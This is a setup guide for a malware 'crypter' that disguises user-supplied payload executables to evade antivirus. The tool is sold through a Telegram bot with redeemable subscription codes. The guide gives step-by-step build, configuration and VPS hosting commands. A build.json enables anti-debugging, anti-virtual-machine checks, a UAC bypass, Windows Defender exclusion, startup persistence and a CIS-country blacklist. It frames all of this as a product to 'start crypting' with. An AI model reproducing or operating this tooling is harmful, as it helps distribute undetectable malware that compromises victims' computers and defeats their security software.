# ?? SETUP GUIDE - Motherfudder Crypter

**Complete Setup Guide** | **30 Minutes Start to Finish** | **100% Automated**

---

## ?? Table of Contents

1. [Quick Start (5 min)](#quick-start)
2. [Detailed Setup (30 min)](#detailed-setup)
3. [Telegram Bot Setup](#telegram-bot-setup)
4. [CLI Mode Setup](#cli-mode-setup)
5. [Troubleshooting](#troubleshooting)
6. [Advanced Configuration](#advanced-configuration)

---

## ? Quick Start

### Windows (Recommended - Fully Automated!)

```batch
# 1. Download the project
git clone https://github.com/your-repo/motherfudder-enhanced
cd motherfudder-enhanced

# 2. Run the MEGA control panel (Right-click ? Run as Administrator)
MOTHERFUDDER.bat

# 3. Follow the menu:
Press 1 ? Install Prerequisites (10-30 min)
Press 2 ? Configure Telegram Bot (2 min)
Press 3 ? Host Bot (instant)

# Done! ??
```

**Total Time**: 30 minutes (mostly waiting for downloads)

---

## ?? Detailed Setup

### Step 1: Install Prerequisites

**Option A: Automated (Recommended)**
```batch
MOTHERFUDDER.bat ? Press 1
```

This installs:
- ? Chocolatey (package manager)
- ? Rust + Cargo
- ? .NET SDK 6.0
- ? Visual Studio Build Tools
- ? OpenSSL
- ? Git

**Option B: Manual**
See [INSTALLATION.md](docs/INSTALLATION.md) for manual installation steps.

---

### Step 2: Get Telegram Bot Token

1. Open Telegram
2. Search for `@BotFather`
3. Send `/newbot`
4. Follow prompts:
   - Bot name: `Motherfudder Crypter`
   - Bot username: `YourName_MfCrypter_bot`
5. Copy the bot token (looks like `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

---

### Step 3: Configure Bot

**Option A: Automated (Recommended)**
```batch
MOTHERFUDDER.bat ? Press 2
```

Wizard will ask for:
- Bot token (from Step 2)
- Authentication key (custom or default)

**Option B: Manual**
```batch
cd MfBuilder
echo TELOXIDE_TOKEN=YOUR_BOT_TOKEN_HERE > .env
```

---

### Step 4: Host the Bot

**Option A: Via Control Panel (Recommended)**
```batch
MOTHERFUDDER.bat ? Press 3
```

**Option B: Manual**
```batch
cd MfBuilder
cargo run --release -- --bot
```

**Option C: Background Service**
```batch
# Via control panel
MOTHERFUDDER.bat ? Press 3 ? Choose "Background Mode"
```

---

## ?? Telegram Bot Setup

### Configuration

**Subscription Codes**:
Edit `MfBuilder/src/telegram_bot.rs`:
```rust
pub const SUBSCRIPTION_CODES: &[&str] = &[
    "MFCRYPT-LIFETIME-2024",    // Example code
    "YOUR-CUSTOM-CODE",          // Add your codes here
];
```

**Support Contact**:
Edit `MfBuilder/src/telegram_bot_handlers.rs`:
```rust
// Change @YourSupportBot to your support contact
"?? Contact: @YourSupportBot"
```

### Testing

1. Open Telegram
2. Search for your bot (`@YourName_MfCrypter_bot`)
3. Send `/start`
4. You should see:

```
?? MOTHERFUDDER CRYPTER BOT

[?? Redeem Code]  [?? My Subscription]
[?? Crypt File]
[? FAQ]  [?? Support]
```

5. Click "Redeem Code"
6. Enter: `MFCRYPT-LIFETIME-2024`
7. Subscription activated! ?

---

## ?? CLI Mode Setup

### Quick Setup

```batch
MOTHERFUDDER.bat ? Press 4
```

### Manual Setup

**1. Configure** (`MfBuilder/build.json`):
```json
{
    "file_extension": "BAT",
    "anti_debug": true,
    "anti_virtual_machine": true,
    "blacklist_cis_countries": false,
    "uac_bypass": true,
    "single_instance": true,
    "run_on_startup": false,
    "defender_exclusion": true,
    "defender_exclude_drive": false,
    "binder": false
}
```

**2. Place payload**:
```batch
copy your_payload.exe MfBuilder\payload.exe
```

**3. Build**:
```batch
cd MfBuilder
cargo run --release
```

**4. Get output**:
- BAT mode: `out.bat`
- EXE mode: `out.exe`

---

## ?? Troubleshooting

### OpenSSL Error

**Error**: `Could not find OpenSSL`

**Fix**:
```batch
# Via control panel
MOTHERFUDDER.bat ? Press 1 ? Reinstall

# Or manually
choco install openssl -y
```

### Bot Not Responding

**Check 1**: Is bot running?
```batch
MOTHERFUDDER.bat ? Press 3
```

**Check 2**: Is token correct?
```batch
# Check MfBuilder/.env
type MfBuilder\.env
```

**Check 3**: Is bot token valid?
- Go to @BotFather
- Send `/mybots`
- Check if your bot exists

### Build Fails

**Error**: `cargo: command not found`

**Fix**: Restart terminal after installing Rust
```batch
# Close current terminal
# Open NEW terminal (to refresh PATH)
# Run again
```

**Error**: `MSBuild not found`

**Fix**:
```batch
MOTHERFUDDER.bat ? Press 1
# Reinstall prerequisites
```

### Bot Token Issues

**Error**: `Invalid bot token`

**Fix**:
```batch
# Reconfigure
MOTHERFUDDER.bat ? Press 2
# Enter correct token
```

---

## ?? Advanced Configuration

### Custom Subscription Codes

**1. Edit codes**:
```rust
// MfBuilder/src/telegram_bot.rs
pub const SUBSCRIPTION_CODES: &[&str] = &[
    "CODE1-LIFETIME-2024",
    "CODE2-PREMIUM-2024",
    "CODE3-TRIAL-2024",
];
```

**2. Rebuild**:
```batch
cd MfBuilder
cargo build --release
```

### Custom FAQ

Edit `MfBuilder/src/telegram_bot_handlers.rs`:
```rust
pub async fn handle_faq(...) {
    let faq_text = "? **Your Custom FAQ**\n\n\
        Q: Your question?\n\
        A: Your answer!\n\n\
        ...";
}
```

### Custom Support Info

Edit `MfBuilder/src/telegram_bot_handlers.rs`:
```rust
pub async fn handle_support(...) {
    let support_text = "?? **Your Support Info**\n\n\
        ?? Contact: @YourSupport\n\
        ...";
}
```

### Background Hosting (VPS)

**Option 1: systemd** (Linux VPS):
```bash
# Via control panel (if on Linux)
MOTHERFUDDER.bat ? Press 3 ? Background Mode

# Or manually
sudo systemctl enable mf-crypter-bot
sudo systemctl start mf-crypter-bot
```

**Option 2: screen** (Linux):
```bash
screen -dmS mf-bot cargo run --release -- --bot
# Detach: Ctrl+A, D
# Reattach: screen -r mf-bot
```

**Option 3: Task Scheduler** (Windows):
```batch
# Via control panel
MOTHERFUDDER.bat ? Press 3 ? Schedule Task
```

---

## ?? Verification Checklist

After setup, verify everything works:

### Telegram Bot
- [ ] Bot responds to `/start`
- [ ] Buttons are clickable
- [ ] Redeem code works
- [ ] Subscription status shows
- [ ] Can upload files
- [ ] Configuration buttons toggle
- [ ] Build process works
- [ ] Receives crypted binary

### CLI Mode
- [ ] `cargo run --release` works
- [ ] Binary is detected
- [ ] Build completes
- [ ] Output file created
- [ ] Output file runs

### Control Panel
- [ ] All menu options work
- [ ] Prerequisites install
- [ ] Bot configuration works
- [ ] Bot hosting works
- [ ] Update check works

---

## ?? Next Steps

After setup:

1. **Test the Bot**:
   - Redeem a test code
   - Upload a test binary
   - Configure options
   - Build and download

2. **Customize**:
   - Add your subscription codes
   - Update support contact
   - Customize FAQ
   - Brand the bot

3. **Deploy** (Optional):
   - Host on VPS
   - Set up systemd service
   - Configure auto-restart
   - Monitor logs

4. **Read Docs**:
   - [Features Guide](docs/FEATURES.md)
   - [Bot Technical](docs/BOT_TECHNICAL.md)
   - [UAC Bypass](docs/UAC_BYPASS_INFO.md)
   - [Defender Exclusion](docs/DEFENDER_EXCLUSION_INFO.md)

---

## ?? Need Help?

**Quick Help**:
```batch
MOTHERFUDDER.bat ? Press 7
```

**Documentation**:
- [Full Docs Index](docs/DOCUMENTATION_INDEX.md)
- [FAQ](docs/BOT_PREVIEW.md#faq)
- [Troubleshooting](docs/INSTALLATION.md#troubleshooting)

**Support**:
- ?? Telegram: @YourSupportBot
- ?? GitHub Issues
- ?? Documentation

---

## ? Setup Complete!

If you've followed this guide, you now have:
- ? Fully functional Telegram bot
- ? CLI mode ready
- ? All prerequisites installed
- ? Documentation accessed
- ? Control panel configured

**Start crypting!** ??

```
?? MOTHERFUDDER CRYPTER BOT

[?? Redeem Code]  [?? My Subscription]
[?? Crypt File]
[? FAQ]  [?? Support]
```

---

**?? Enjoy your production-ready crypter!**
